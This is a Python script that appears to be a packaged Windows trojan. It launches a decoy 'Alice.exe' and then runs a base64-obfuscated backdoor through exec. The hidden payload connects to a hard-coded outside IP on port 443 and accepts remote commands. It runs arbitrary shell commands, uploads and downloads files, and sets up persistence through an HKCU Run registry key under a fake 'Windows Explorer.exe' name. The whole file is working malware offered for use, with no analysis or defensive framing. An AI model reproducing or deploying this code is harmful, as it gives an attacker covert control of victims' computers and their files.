import socket, subprocess, json, os, base64, sys, shutil, time

current = os.getcwd()
evil = os.environ["appdata"]

if current != evil:
	file_name = sys._MEIPASS + "\Alice.exe"
	subprocess.Popen(file_name, shell=True)
try:
	exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoNCmltcG9ydCBzb2NrZXQsIHN1YnByb2Nlc3MsIGpzb24sIG9zLCBiYXNlNjQsIHN5cywgc2h1dGlsLCB0aW1lDQoNCmNsYXNzIEJhY2tkb29yOg0KCWRlZiBfX2luaXRfXyhzZWxmLCBpcCwgcG9ydCk6DQoJCXNlbGYuY29ubmVjdGlvbiA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCgkJc2VsZi5jb25uZWN0aW9uLmNvbm5lY3QoKGlwLCBwb3J0KSkNCg0KCWRlZiBiZWNvbWVfcGVyc2lzdGVudChzZWxmKToNCgkJZXZpbF9maWxlX2xvY2F0aW9uID0gb3MuZW52aXJvblsiYXBwZGF0YSJdICsgIlxcV2luZG93cyBFeHBsb3Jlci5leGUiDQoJCWlmIG5vdCBvcy5wYXRoLmV4aXN0cyhldmlsX2ZpbGVfbG9jYXRpb24pOg0KCQkJc2h1dGlsLmNvcHlmaWxlKHN5cy5leGVjdXRhYmxlLCBldmlsX2ZpbGVfbG9jYXRpb24pDQoJCQlzdWJwcm9jZXNzLmNhbGwoJ3JlZyBhZGQgSEtDVVxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4gL3YgdGVzdCAvdCBSRUdfU1ogL2QgIicgKyBldmlsX2ZpbGVfbG9jYXRpb24gKyAnIicsIHNoZWxsPVRydWUpDQoJCQlyZXR1cm4gIlsrXSBQZXJzZXZlcmFuY2UgaW5zdGFsbGVkIHN1Y2Nlc3NmdWxseS4iDQoJCWVsc2U6DQoJCQlyZXR1cm4gIlstXSBUaGUgYmFja2Rvb3IgaXMgYWxyZWFkeSBwZXJzaXN0ZW50LiINCg0KCWRlZiByZWxpYWJsZV9zZW5kKHNlbGYsIGRhdGEpOg0KCQlqc29uX2RhdGEgPSBqc29uLmR1bXBzKGRhdGEpDQoJCXNlbGYuY29ubmVjdGlvbi5zZW5kKGpzb25fZGF0YS5lbmNvZGUoKSkNCg0KCWRlZiByZWxpYWJsZV9yZWNlaXZlKHNlbGYpOg0KCQlqc29uX2RhdGEgPSBiIiINCgkJd2hpbGUgVHJ1ZToNCgkJCXRyeToNCgkJCQlqc29uX2RhdGEgPSBqc29uX2RhdGEgKyBzZWxmLmNvbm5lY3Rpb24ucmVjdigxMDI0KQ0KCQkJCXJldHVybiBqc29uLmxvYWRzKGpzb25fZGF0YSkNCgkJCWV4Y2VwdCBWYWx1ZUVycm9yOg0KCQkJCWNvbnRpbnVlDQoNCglkZWYgZXhlY3V0ZV9zeXN0ZW1fY29tbWFuZChzZWxmLCBjb21tYW5kKToNCgkJREVWTlVMTCA9IG9wZW4ob3MuZGV2bnVsbCwgIndiIikNCgkJcmV0dXJuIHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KGNvbW1hbmQsIHNoZWxsPVRydWUsIHN0ZGVycj1ERVZOVUxMLCBzdGRpbj1ERVZOVUxMKQ0KDQoJZGVmIGNoYW5nZV93b3JraW5nX2RpcmVjdG9yeV90byhzZWxmLCBwYXRoKToNCgkJb3MuY2hkaXIocGF0aCkNCgkJcmV0dXJuICJbK10gQ2hhbmdpbmcgd29ya2luZyBkaXJlY3RvcnkgdG8gIiArIHBhdGgNCg0KCWRlZiByZWFkX2ZpbGUoc2VsZiwgcGF0aCk6DQoJCXdpdGggb3BlbihwYXRoLCAicmIiKSBhcyBmaWxlOg0KCQkJcmV0dXJuIGJhc2U2NC5iNjRlbmNvZGUoZmlsZS5yZWFkKCkpDQoNCglkZWYgd3JpdGVfZmlsZShzZWxmLCBwYXRoLCBjb250ZW50KToNCgkJd2l0aCBvcGVuKHBhdGgsICJ3YiIpIGFzIGZpbGU6DQoJCQlmaWxlLndyaXRlKGJhc2U2NC5iNjRkZWNvZGUoY29udGVudCkpDQoJCXJldHVybiAiWytdIFVwbG9hZCBzdWNjZXNzZnVsLiINCg0KCWRlZiBydW4oc2VsZik6DQoJCXdoaWxlIFRydWU6DQoJCQljb21tYW5kID0gc2VsZi5yZWxpYWJsZV9yZWNlaXZlKCkNCgkJCXRyeToNCgkJCQlpZiBjb21tYW5kWzBdID09ICJleGl0IjoNCgkJCQkJc2VsZi5jb25uZWN0aW9uLmNsb3NlKCkNCgkJCQkJc3lzLmV4aXQoKQ0KCQkJCWVsaWYgY29tbWFuZFswXSA9PSAiY2QiIGFuZCBsZW4oY29tbWFuZCkgPiAxOg0KCQkJCQljb21tYW5kX3Jlc3VsdCA9IHNlbGYuY2hhbmdlX3dvcmtpbmdfZGlyZWN0b3J5X3RvKGNvbW1hbmRbMV0pDQoJCQkJZWxpZiBjb21tYW5kWzBdID09ICJwZXJzaXMiOg0KCQkJCQljb21tYW5kX3Jlc3VsdCA9IHNlbGYuYmVjb21lX3BlcnNpc3RlbnQoKQ0KCQkJCWVsaWYgY29tbWFuZFswXSA9PSAiZG93bmxvYWQiOg0KCQkJCQljb21tYW5kX3Jlc3VsdCA9IHNlbGYucmVhZF9maWxlKGNvbW1hbmRbMV0pLmRlY29kZSgpDQoJCQkJZWxpZiBjb21tYW5kWzBdID09ICJ1cGxvYWQiOg0KCQkJCQljb21tYW5kX3Jlc3VsdCA9IHNlbGYud3JpdGVfZmlsZShjb21tYW5kWzFdLCBjb21tYW5kWzJdKQ0KCQkJCWVsc2U6DQoJCQkJCWNvbW1hbmRfcmVzdWx0ID0gc2VsZi5leGVjdXRlX3N5c3RlbV9jb21tYW5kKGNvbW1hbmQpLmRlY29kZSgnY3A4NjYnKQ0KCQkJZXhjZXB0IEV4Y2VwdGlvbjoNCgkJCQljb21tYW5kX3Jlc3VsdCA9ICJbLV0gRXJyb3IgZHVyaW5nIGNvbW1hbmQgZXhlY3V0aW9uLiINCgkJCXNlbGYucmVsaWFibGVfc2VuZChjb21tYW5kX3Jlc3VsdCkNCg0KI3RpbWUuc2xlZXAoMTApDQoNCnRyeToNCglteV9iYWNrZG9vciA9IEJhY2tkb29yKCI3OC4zNi40NC4zIiwgNDQzKQ0KCW15X2JhY2tkb29yLnJ1bigpDQpleGNlcHQgRXhjZXB0aW9uOg0KICAgIHN5cy5leGl0KCkNCg==')))
except Exception:
    sys.exit()
